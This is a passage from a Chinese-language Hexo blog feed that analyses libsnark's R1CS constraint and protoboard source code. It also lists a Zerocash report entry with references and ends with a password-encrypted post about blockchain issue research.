class="keyword">template</span>&lt;<span class="keyword">typename</span> FieldT&gt;</span><br><span class="line"><span class="keyword">void</span> protoboard&lt;FieldT&gt;::add_r1cs_constraint(<span class="keyword">const</span> r1cs_constraint&lt;FieldT&gt; &amp;constr, <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp;annotation)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUG</span></span><br><span class="line">    assert(annotation != <span class="string">""</span>);</span><br><span class="line">    constraint_system.constraint_annotations[constraint_system.constraints.size()] = annotation;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">    libff::UNUSED(annotation);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    constraint_system.constraints.emplace_back(constr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中<code>r1cs_constraint_system&lt;FieldT&gt; constraint_system</code></p><p>且<code>constraint_system.constraints</code>的类型为<code>std::vector&lt;r1cs_constraint&lt;FieldT&gt; &gt;</code></p><p>于是我们跟进到<code>r1cs_constraint</code>类：</p><p><strong>libsnark/relations/constraint_satisfaction_problems/r1cs/r1cs.hpp : L41-70</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * A R1CS constraint is a formal expression of the form</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *                &lt; A , X &gt; * &lt; B , X &gt; = &lt; C , X &gt; ,</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * where X = (x_0,x_1,...,x_m) is a vector of formal variables and A,B,C each</span></span><br><span class="line"><span class="comment"> * consist of 1+m elements in &lt;FieldT&gt;.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * A R1CS constraint is used to construct a R1CS constraint system (see below).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> FieldT&gt;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">r1cs_constraint</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">    linear_combination&lt;FieldT&gt; a, b, c;</span><br><span class="line"></span><br><span class="line">    r1cs_constraint() &#123;&#125;;</span><br><span class="line">    r1cs_constraint(<span class="keyword">const</span> linear_combination&lt;FieldT&gt; &amp;a,</span><br><span class="line">                    <span class="keyword">const</span> linear_combination&lt;FieldT&gt; &amp;b,</span><br><span class="line">                    <span class="keyword">const</span> linear_combination&lt;FieldT&gt; &amp;c);</span><br><span class="line"></span><br><span class="line">    r1cs_constraint(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">initializer_list</span>&lt;linear_combination&lt;FieldT&gt; &gt; &amp;A,</span><br><span class="line">                    <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">initializer_list</span>&lt;linear_combination&lt;FieldT&gt; &gt; &amp;B,</span><br><span class="line">                    <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">initializer_list</span>&lt;linear_combination&lt;FieldT&gt; &gt; &amp;C);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">bool</span> <span class="keyword">operator</span>==(<span class="keyword">const</span> r1cs_constraint&lt;FieldT&gt; &amp;other) <span class="keyword">const</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">friend</span> <span class="built_in">std</span>::ostream&amp; <span class="keyword">operator</span>&lt;&lt; &lt;FieldT&gt;(<span class="built_in">std</span>::ostream &amp;out, <span class="keyword">const</span> r1cs_constraint&lt;FieldT&gt; &amp;c);</span><br><span class="line">    <span class="keyword">friend</span> <span class="built_in">std</span>::istream&amp; <span class="keyword">operator</span>&gt;&gt; &lt;FieldT&gt;(<span class="built_in">std</span>::istream &amp;in, r1cs_constraint&lt;FieldT&gt; &amp;c);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>注意到参数类型为<code>linear_combination</code>的构造函数，继续跟进相关类：</p><figure><img src= "/img/loading.gif" data-src="/2021/10/17/libsnark-related/image-20211017201752561.png" alt="image-20211017201752561"><figcaption aria-hidden="true">image-20211017201752561</figcaption></figure><figure><img src= "/img/loading.gif" data-src="/2021/10/17/libsnark-related/image-20211017205311619.png" alt="image-20211017205311619"><figcaption aria-hidden="true">image-20211017205311619</figcaption></figure><p><strong>libsnark/relations/variable.hpp : L144-158</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * A linear combination represents a formal expression of the form "sum_i coeff_i * x_&#123;index_i&#125;".</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> FieldT&gt;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">linear_combination</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;linear_term&lt;FieldT&gt; &gt; terms;</span><br><span class="line"></span><br><span class="line">    linear_combination() &#123;&#125;;</span><br><span class="line">    linear_combination(<span class="keyword">const</span> <span class="keyword">integer_coeff_t</span> int_coeff);</span><br><span class="line">    linear_combination(<span class="keyword">const</span> FieldT &amp;field_coeff);</span><br><span class="line">    linear_combination(<span class="keyword">const</span> variable&lt;FieldT&gt; &amp;var);</span><br><span class="line">    linear_combination(<span class="keyword">const</span> linear_term&lt;FieldT&gt; &amp;lt);</span><br><span class="line">    linear_combination(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;linear_term&lt;FieldT&gt; &gt; &amp;all_terms);</span><br></pre></td></tr></table></figure><p>参数类型为<code>std::vector&lt;linear_term&lt;FieldT&gt; &gt;</code>的构造函数具体实现如下：</p><p><strong>libsnark/relations/variable.tcc : L484-508</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> FieldT&gt;</span><br><span class="line">linear_combination&lt;FieldT&gt;::linear_combination(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;linear_term&lt;FieldT&gt; &gt; &amp;all_terms)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (all_terms.empty())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    terms = all_terms;</span><br><span class="line">    <span class="built_in">std</span>::sort(terms.begin(), terms.end(), [](linear_term&lt;FieldT&gt; a, linear_term&lt;FieldT&gt; b) &#123; <span class="keyword">return</span> a.index &lt; b.index; &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">auto</span> result_it = terms.begin();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> it = ++terms.begin(); it != terms.end(); ++it)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (it-&gt;index == result_it-&gt;index)</span><br><span class="line">        &#123;</span><br><span class="line">            result_it-&gt;coeff += it-&gt;coeff;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            *(++result_it) = *it;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    terms.resize((result_it - terms.begin()) + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该构造函数中还做了<code>linear_item::index</code>（变量标识）的合并，表现为coeff相加</p><p>以及其他参数类型的构造函数，比如</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> FieldT&gt;</span><br><span class="line">linear_combination&lt;FieldT&gt;::linear_combination(<span class="keyword">const</span> FieldT &amp;field_coeff)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">this</span>-&gt;add_term(linear_term&lt;FieldT&gt;(<span class="number">0</span>, field_coeff));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// r1cs.hpp L108-111👇</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* <span class="doctag">NOTE:</span></span></span><br><span class="line"><span class="comment">* The 0-th variable (i.e., "x_&#123;0&#125;") always represents the constant 1.</span></span><br><span class="line"><span class="comment">* Thus, the 0-th variable is not included in num_variables.</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>至此我们知道如何去构建一个<code>r1cs_constraint{_system_}</code>的后半部分</p><figure><img src= "/img/loading.gif" data-src="/2021/10/17/libsnark-related/image-20211017211212901.png" alt="image-20211017211212901"><figcaption aria-hidden="true">image-20211017211212901</figcaption></figure><hr><p>现在回到前半部分：</p><p>gadgetlib1提供了<code>pb_variable</code>、<code>pb_variable_array</code>、<code>pb_linear_combination</code>和<code>pb_linear_combination_array</code>四个类，是对<code>variable</code>、<code>linear_combination</code>的封装</p><p><strong>libsnark/gadgetlib1/pb_variable.hpp &amp; pb_variable.tcc</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> FieldT&gt;</span><br><span class="line"><span class="keyword">void</span> pb_variable&lt;FieldT&gt;::allocate(protoboard&lt;FieldT&gt; &amp;pb, <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp;annotation)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">this</span>-&gt;index = pb.allocate_var_index(annotation);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* allocates pb_variable&lt;FieldT&gt; array in MSB-&gt;LSB order */</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> FieldT&gt;</span><br><span class="line"><span class="keyword">void</span> pb_variable_array&lt;FieldT&gt;::allocate(protoboard&lt;FieldT&gt; &amp;pb, <span class="keyword">const</span> <span class="keyword">size_t</span> n, <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp;annotation_prefix)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUG</span></span><br><span class="line">    assert(annotation_prefix != <span class="string">""</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    (*<span class="keyword">this</span>).resize(n);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; n; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        (*<span class="keyword">this</span>)[i].allocate(pb, FMT(annotation_prefix, <span class="string">"_%zu"</span>, i));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要注意的是<code>pb_variable::allocate</code>👉<code>protoboard::allocate_var_index</code>（即分配输入变量的相关部分）</p><p><strong>libsnark/gadgetlib1/protoboard.hpp : L34 &amp; protoboard.tcc : L37-49</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">r1cs_variable_assignment&lt;FieldT&gt; values; <span class="comment">/* values[0] will hold the value of the first allocated variable of the protoboard, *NOT* constant 1 */</span></span><br><span class="line"><span class="comment">// values将存储着r1cs一系列变量的*值*</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> FieldT&gt;</span><br><span class="line"><span class="keyword">var_index_t</span> protoboard&lt;FieldT&gt;::allocate_var_index(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp;annotation)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUG</span></span><br><span class="line">    assert(annotation != <span class="string">""</span>);</span><br><span class="line">    constraint_system.variable_annotations[next_free_var] = annotation;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">    libff::UNUSED(annotation);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    ++constraint_system.auxiliary_input_size;</span><br><span class="line">    values.emplace_back(FieldT::zero());<span class="comment">// 初始化</span></span><br><span class="line">    <span class="keyword">return</span> next_free_var++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>具体的gadget实现例子可参考</p><ul><li><a href="https://zhuanlan.zhihu.com/p/46477111" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/46477111</a></li><li><a href="https://mp.weixin.qq.com/s?__biz=MzU5MzMxNTk2Nw==&amp;mid=2247486482&amp;idx=1&amp;sn=407d59e7fc47de0e929c653ce00eb260&amp;chksm=fe131d02c9649414b27a0684ce950b2a63a84ca9c901f81b7251964befd3388e0f616df5bd4b&amp;mpshare=1&amp;scene=23&amp;srcid=1017nCZqhISM0Sl0iPguEI88&amp;sharer_sharetime=1634453102359&amp;sharer_shareid=947c15bf6520d15b99a01837d68f8d7e#rd" target="_blank" rel="noopener">零知识证明 - libsnark源代码分析</a></li><li><a href="https://securitylab.disi.unitn.it/lib/exe/fetch.php?media=teaching:cryptofintech:2018:tut1.pdf" target="_blank" rel="noopener">https://securitylab.disi.unitn.it/lib/exe/fetch.php?media=teaching:cryptofintech:2018:tut1.pdf</a></li></ul><p>libsnark还会用到libff（C++ library for Finite Fields and Elliptic Curves）等库👈e.g. <code>#define FMT libff::FORMAT</code>，在此不加赘述</p>]]></content>
      
      
      <categories>
          
          <category> Blockchain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Zerocash_Report</title>
      <link href="/2021/05/20/Zerocash-Report/"/>
      <url>/2021/05/20/Zerocash-Report/</url>
      
        <content type="html"><![CDATA[<h3 id="report">Report</h3><div class="row">    <embed src="Zerocash_Report.pdf" width="100%" height="550" type="application/pdf"></div><h3 id="reference">Reference</h3><p><a href="Survey-SNARKs.pdf">Survey-SNARKs.pdf</a></p><p><a href="Zerocash_%20Decentralized%20anonymous%20payments%20from%20bitcoin(extended).pdf">Zerocash_ Decentralized anonymous payments from bitcoin(extended).pdf</a></p><p><a href="zkSNARK-explained-III.pdf">zkSNARK-explained-III.pdf</a></p><h3 id="appendix">Appendix</h3><p><a href="https://learnblockchain.cn/2019/05/07/qsp-qap/" target="_blank" rel="noopener">零知识证明 - 从QSP到QAP</a></p><p>参考自V神(<span class="math inline">\(R1CS\Rightarrow QAP\)</span>)</p><p>➡<span class="citation" data-cites="VitalikButerin/quadratic-arithmetic-programs-from-zero-to-hero-f6d558cea649">[https://medium.com/@VitalikButerin/quadratic-arithmetic-programs-from-zero-to-hero-f6d558cea649]</span>(https://medium.com/<span class="citation" data-cites="VitalikButerin/quadratic-arithmetic-programs-from-zero-to-hero-f6d558cea649">@VitalikButerin/quadratic-arithmetic-programs-from-zero-to-hero-f6d558cea649</span>)</p><p>zcash的处理方式则是直接<span class="math inline">\(Circuit\Rightarrow QAP\)</span></p><p>(二者最后的拉格朗日多项式插值处理部分仍一致)</p><p>可参考</p><ul><li><a href="https://blog.csdn.net/weixin_43179764/article/details/102807826?spm=1001.2014.3001.5501" target="_blank" rel="noopener">https://blog.csdn.net/weixin_43179764/article/details/102807826?spm=1001.2014.3001.5501</a></li><li>zkSNARK-explained-III.pdf (2.5. QAP construction for the circuit in section 2.2.)</li></ul>]]></content>
      
      
      <categories>
          
          <category> Blockchain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Issue Research for Blockchain(Chaitin)</title>
      <link href="/2020/12/26/Issue-Research-for-Blockchain-Chaitin/"/>
      <url>/2020/12/26/Issue-Research-for-Blockchain-Chaitin/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Password required.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="c0b3d7424921774b27daf82c8561967caf52b41f034cd8a5a845dbe2361d6ae1">58bb4da7d8597728c92a7faee018826e8ec2893bfacb0d060a04758bfcac1931c81ccc0dfb1d226c05254a6c7936f17e99cc3822a8a76364a465a4ec513c00a1c4a3104cd2aa84a4dbbf27934794693f1fc154db3c39c85c5a0ecdf2b93879d93f67e504efabd0a4407f35a2c9499723783139411c9a3ba29637429cd86e53d67b03434ee1f2209cf2e08483deb747c94692fad3f89c8813353c12866da788300712ce65333e7a75d5504978c0ba79aab2b83924301dcf729429a6868f2f6a794a97347556870293b1b9890faef29ebefa53fbfa4683dae580ef420ac5f7f726103e2f3e0640a5ebc401e181528960e07c4850f9188eb2ed37e4bfb0e65f4d2f4944e96db96db356721f4134aca541171853328d42d338c907bc25edecb2009d24c37345bf104a5220804c942543e33a91cc8d7b8d7ccf3cab9930c6d50aa7d100045ac0c7aef90bf9c5f3fa68e63ec464448c00d321203e0fae40ac827d1855784c6414a207ec344785f4355271ff41b119eb8142b13615ba1b931ec617095511732637d87c06795e7f4cc2a6393764905ce099b7d2eb16eedb217cf692854182c4cbc3dc4aa34fe4483378d4c31766543e842fa360ada0985c748df4a081db925772e613fd56da4b3fb987fef936c266e7e0b1d57efb8ff436ff10babc8039543079f7dddc1d22558670f647b7977157730c6832f6e192e51fc4636bec1d8e7b530b1c6f803c24c7f2532116f6d003835e49d338888a4477783ec05ee877c560392fd7ce8711011a085ec52686183485df7013595631fa09567ab778b5ccd98e41e1e1ae838c835f38084d94d9ad52cd02437b5d2ca400e441fb59869945329fa33a3a6c791dea9dbfc572d843cc63e45da1d0e7c0eb68dc9b01cf38ec9ccc117f8c6a49ff6ce6eb90f49097ab5055fcddef2b81a43a0129b67e9a3426b08ce9724772ee2a206e02819d8346fb3318a61f5352b3fa284908362c5df8b3ea3a911070b1296a0687009f29caf1e3cc108ebc7ae12e2c7b73a65d61040132a41c5a22989fb9bd32af07776ab04ec51968e125d8307e9ea1de8975de1dfa567aed4cd1521eef65419c31f5e83d11cc8421144dbd32d9d92ec88d774596a3dd1312aa81139c512fa5032f66b5d97f2d8d51f674a3807e170584dca8bd763bd5825af35f15f80b40f09cfbc9a207601351e42d50106bc01b3e4ab8549c73751040ab916544d43bfcb5e159020fe30d2b209c8c8cf3e6af2df7b9ff0b522c4317f8c966ada93c47e4eecfcdbf4adcee9583d27158f38a27367ce238347e455e9b1a99b92a947137988be0c8386af39c7918ee29ec30f4172b4b6534de1371adada1dd6289fd4068a856a07293b5a4e102784742b09db6d126d4e4a53b20ad8b7c1e0e481af30fb3ce34bf827be27204c2ef894fc2b3880d875b5d5d480f78f155c12c8804e2c515e633aec1feb32106d77fbe1f3c2a245ff6f617c3b737c7c21f9dc0e1d8ccee8ec11c4aa12b2fa5d8fd812311122c9bbb38f8a309c991448266ce16793c27b303d0f6d0a315cc381f9dfe823d2597ebd8ca498067a8c1c29b36f113a57794e98be63b4eff82ebda63e88ad6f22d66019aabfd7e3be5f9d0f99ecb183cb528417156b8a4a302c7ec2edd77f56441f61d68906f8c8360f74a73a5cdb947ec2aeaee650f7635f18375dab530419f9d2dc5147fb759b2b6f10560954636215f8e7a9d8252edbe58eb16f6c56c8783e2ce0244289df7c04086f1f8894eea91c371be55fc54740c1de21818a72ef9d61536bbbcd663703c1b76176944eca78cc552edbfef446af3cee3c30e9196197092c5a586549cc80eade16e7366f3d21ff9444ea2b5824a9878a17fb8596b2ce7e571bac546c06c9af8e19b59755051bfb7af0d5998af72bdeb53067fe0ff3638a7e5eed174c6d32d92553de7a2eca464b6346f29ab6c76d96288eb0f4c7914363ea553b3d8b938c7da1f994639ee42504b6f2bce2bc56b3b8a9324f92a85179aaa1d4a18a1a180db5daf74356f44464a2032c4431dc61cbfca6195f2433ddd9e25780c8fd19cef202c32dc494594d60f270a6e8c304a961fc375016181bc7dcf635f78ca25136bdf2cd1865430781d5d1a6d4b43f8c12b7aea6eb3ce45024b1f168fcad6b343e97aa802188e1f4ee5d27a14d0489fcebb0bac203802303e236eed776fc342d0158700f7be6533afcdcd6a470b9f45bb413340ca222bcc8607e094d49093037edd0aad69840859430878a6ebd32990712ab4bb64a8a3fe3b0ca484900952e9165f475ffae93850ad85b99c664269cea0862426e447b614e7a9f4ad3961181f0e06aa0ea9f751ae14d3e53b15bc3c66df453cd6bf3441ec00eb9363e3c1613b1d4a3cb1d7c585de21409d62ac5127f65c502b6d9d7d1cca2b297d857e00a7a7b34d1558a486476cbecdb9a32a3e663a817c45656bd69ddcbcec47b85aeb18914dadf2cedc54b9f556144d68e51bfab53d5b3b3e73f368e46e10e9650449404e78c622e7765bd7216a64ba7b74281b60dd245c4c7b26676e081b041871e762a70aa9e7be225ab84b2ca2abd74cfb115b03e6271968397c79407ac231692176e3de322bc92708f346a4ef4df6c091969eba18c9af60bb6c4b0db6474dad3488f69f28f2d5fd123eccf3524c91bafe2040a04d07c9da51cdc97776aab6faa845c5c4d5ff1c27423d8d87671a3f95c0fd168be420e3afda998120f7175eeabbbcd893998874dd47c2e0dffd306fe2bc63b4d192414b7cee233a7ee6f48e9ed2475d5c36f32d2503c0ee447c2e77aff38f4f263f008ac9d738871dfe91630ded644ad2b407e531e24fd16e130a873bbd237e024279c6da18d81db7abd4076eb8d6e9db2a1339b3db1fa29932588909aa657c37b7da44ca1d444843360b0a6ac41cab6d59653897161b60c224d464568d2ff5c5d8fcc7b7afe9cf81a70487ca933a58fdeddf6840e20e11618bf0006408fb0140f83790a100af72a7011997ac05aa9418cff71186f5d8f303df79fab7d2203d42aff7da700562c42973271494cd9daccaf4ba06bacce20e59662cff9fab9be0ae6035046cd240e62985eec0a999a9e4a4c5e581f0ee8e04c596b028ade7bf6510f59c3abd155d94e81b88119b78143f93f976a5106ea4c7c1c7568010b4ecf80efea2e8e51662ac5a8b87bab725fd0a68dd3fac94dcdc536ca6a5ff53a4c225b63fbe40bd9cb5ee993d507aace89278ace768fd79eab57c15d1a4a85cd3a7ac4a50ad8c2d9f24cb47befca1eb9af98e6487e6d37b2c43aaedfb15de3780d03ba001ab026592feb8c8c230d929f741f421a8dd0828504a6e71b1b18fb15db8bdd88a350e50877b258918bd34f0a0fa4c7540c7fcbb0dd8a4f8cc40abb87b58d5666e007ee93d27229bd31ad35a00689dbe00b700fb917e4459ee8ee95369368907b5f6eba15928e984c51aeff34cb28a6f54b38720e373d6d658ce571d957100cadc33cc165548ac266159d4200da46c27b402bdd20c822155255dd87352779f89771afb4a43a9ac06fd9b8e9b428d32b91e5d46dd9c6d2b2fa83d50349ea952252538c0aa76331c7cbdf0c53afa540eeeafc11687040904c409292cf2723cce948d21fd1b7a81280a70d83e4d28ae26f1f204308e9d764853257309a1eacf6d71ca6c19ca4b16d686d39e4d9103aa857e5c9922d5a8a15498459292798c5b8923299d0d3c6b435cc1cc932077c7b0a493ea2f8e60f4364f7da8b47df1b05d095b6b1ec747dde7998954b8a1fd20c3033c6e5070b982fd60113ba2afbe62fd07dd20ceb8ec663af951b7ded3b0f29287cb0ae1ee385d70546a9c15a57a9da96433a37ffc8b1465b4d4476449f202268bfc62c886c65ca3508abb71205c11feacbe344e1cda1e0d50952d141d4ec83a2c7ed8d09ee3c3c19a559cc410577337857384755f75db55c4b4c5aa5da23f923719f3698ac0d044907a3d328deafb1f94d9807219340c46e65354da99a7871c49c2beeff88e84160da11255712a8a664983e93a55254bb1cf6c8d1e32c61af6575c4cf1363fda70f4c46ed00049bb3171f040feb6cb791deeeeea7dfaac4754f29bc090dab24cd8c8e268fd2d127641d7f3a9d22dbd422a3489dd70dc5afddd58857d0c931d5b6e5bd09d5824245ffb6ca9b0b587b59a44e7e03a61429d40f010ab9e7fe7131a5e6f2ca6140b6303864ac39f394d2bf4da582ca1c35bfbed6b49d30462b554addce043ed979d5db7644f174241cbb075cd5238eb278d021bce792c1460ee092d08a8d5959a20687a035e13a402c913ee20e53cec6401da142dc98dd9a7ca954e74d47c22fef55f71326ae429eb23d8021b844d5ab2788c28581f091f63e60460ad20e863dc78f5cb29c0eb22233c57c2ff51af21f9d080ad93b7f791463dcb58d71021ce454a9aece2b674f365500a341b0804d1bec7e32ee15d110e212f236ac1b3016288ab3e0cf147acf5cfdffba3977237dd4e53f05d2895c5d56dd956c666b3bf8388113ae70e37b425a4c9f3faa1b7257386eab3ab13309be8a945ca8ad3b695ce26ed35a6bfbad4e012b79e70be70b73ec65084cfc526b0fb02e5b35580a83305c5ef8f9fbfdb96e5fb2f99bad3596ccb49bb083d62d3473390866f3f0dba8efc7fa1ca0be71e56f043b97bb29abc4adce439aadb0d7a239ef3587ec123d237671fe0bbce68a42244361066937deda9b2627ce3986fbc3eceb349ad163b1b58e21f506e6341ef3e55d96c74c5be57c2ed510bf106a33ad124c153bebc707012d0fe28cd1162c0c6d6a282f8147ed10e788095d84c42f54d2bb22c7bf3a0984f03f3d755b888d888fe8e93454065adadd1b8a17178af21399634c51889778bdb4846eb89c5342754dfef5a192ddf197a430289e47e21d7700e612ea3206bb85e58848e7beeeaad06db9dd90676312ea44a8209a6767f71af69109b8c1b0a8c7fa1d9bed8f998c756049ee51ef42f279599894535b3e22c390e0d9b48d18f1c83c5e3404aaa466e2295f84cc5da0612137979dc432caf1db472a58cea8d0534cef938ebb02e2e082239215a09ae906fd56de823e4f9e2dfb042df329a9252c354b3b189b69a067d03491546b46b04433fcb7184f3572c5b4b8eca9687a50ef7d69ccec4abb2c51e88c913e1a967b22e7212bb3b21cc9890b550e2162d20557dcee8bb8e76d143fea760d945a146d0da5ac15de3a8750bcbe027315f59855ccf2e6383cae715afce534d736352ce5799648e3b489455e992a7a2358d63eab96dadefa32f63e2988254e2ffe9ae39378567b59e8e594c7b7d635339bcc6d3b4d37d3a784852d79406d61f7c5634ec51244d9b81aea430f349b96fec68815351eee88a02aa9616d958a14f49cb0318160ad24a72415d0d6fca6fe58ee9796e9adc9f7d0537385f432e4a446ea7dc263aeedacb794d7ee76a5f7c236d64d3c205bfcdf322f4ed3f737f95d8a627215467c4af67e7c3901ce230aff933d83696022963819bae932b309c5c600e240546d1828e18106a83d2e93cc1d3726afd78eaa3cf2caaa68f75d77080cfae3973ddf2d89a8ca32c612e3599ca1f4bd836a7b817637801f48d54ae9c59bf0834e15024f56ff35d846808d7d20945c4f6afe27080e3d168a1e770f971463dc316e221a05efffb8ab58b335567afd42d807a0111923d20c68a6e9c5f4bbea2d7baf69386b62932951a559f33ac8f450510bd27ae8e7f63fd024757ce69e0a58e07eff1c6ef95a6b799c565aa417560f4977ce9df603209ce7bab964beac68cd7fa487bf41d57e6324003b403c562fa28ffb4bacf4f281fd9cc0af51cfd6108dc3dc067f37d093ffce4a72c558b714abc19dccf59b9d8c4de4f977d890da1cab61a33413f2d8c21e5a839ecb959d08d9558789650e988725828bcfc7a59fe4079663a97a24c5bc6d8a3196c07d